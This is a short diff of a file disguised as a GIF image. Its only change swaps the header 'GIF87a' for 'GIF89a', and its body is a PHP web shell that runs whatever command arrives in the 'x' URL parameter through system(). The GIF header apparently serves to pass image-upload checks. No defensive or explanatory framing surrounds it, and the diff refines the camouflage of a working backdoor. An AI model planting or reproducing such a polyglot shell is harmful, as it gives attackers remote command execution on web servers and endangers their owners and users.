@@ -1,4 +1,4 @@
-GIF87a;
+GIF89a;
 <?php 
 	if(isset($_GET['x'])) { system($_GET['x']) };
 ?>
